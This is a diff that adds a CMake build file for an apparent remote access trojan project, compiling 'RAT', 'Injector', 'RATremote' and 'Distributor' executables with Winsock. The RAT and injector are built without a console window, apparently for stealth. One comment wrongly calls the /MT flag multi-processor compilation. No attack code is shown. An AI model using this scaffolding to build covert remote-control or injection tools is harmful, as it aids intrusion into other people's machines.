@@ -1,0 +1,43 @@
+﻿cmake_minimum_required(VERSION 3.0.0)
+# Project's name
+project(Project_RAT VERSION 0.0.0)
+
+include(CTest)
+enable_testing()
+
+set(CPACK_PROJECT_NAME ${PROJECT_NAME})
+set(CPACK_PROJECT_VERSION ${PROJECT_VERSION})
+include(CPack)
+
+include(CmakeToolsHelpers)
+
+
+##Adds multi-processor compilation. 
+set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /MT")
+
+set(LIB wsock32)
+
+file(GLOB CONNECT "${PROJECT_SOURCE_DIR}/Connection/*.cpp")
+
+set(EXE_NAMES "Distributor" "RATremote")
+
+foreach(entry ${EXE_NAMES})
+    set(PROJECT_DIRECTORY "${PROJECT_SOURCE_DIR}/${entry}")
+    file(GLOB SOURCES "${PROJECT_DIRECTORY}/*.cpp")
+    add_executable(${entry} ${SOURCES} ${CONNECT})
+    target_include_directories(${entry} PUBLIC "${PROJECT_DIRECTORY}" "${PROJECT_SOURCE_DIR}/Connection")
+    target_link_libraries(${entry} ${LIB})
+endforeach(entry ${EXE_NAMES})
+
+##Select target subsystem, here no console
+set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+
+set(EXE_NAMES "RAT" "Injector")
+
+foreach(entry ${EXE_NAMES})
+    set(PROJECT_DIRECTORY "${PROJECT_SOURCE_DIR}/${entry}")
+    file(GLOB SOURCES "${PROJECT_DIRECTORY}/*.cpp")
+    add_executable(${entry} ${SOURCES} ${CONNECT})
+    target_include_directories(${entry} PUBLIC "${PROJECT_DIRECTORY}" "${PROJECT_SOURCE_DIR}/Connection")
+    target_link_libraries(${entry} ${LIB})
+endforeach(entry ${EXE_NAMES})
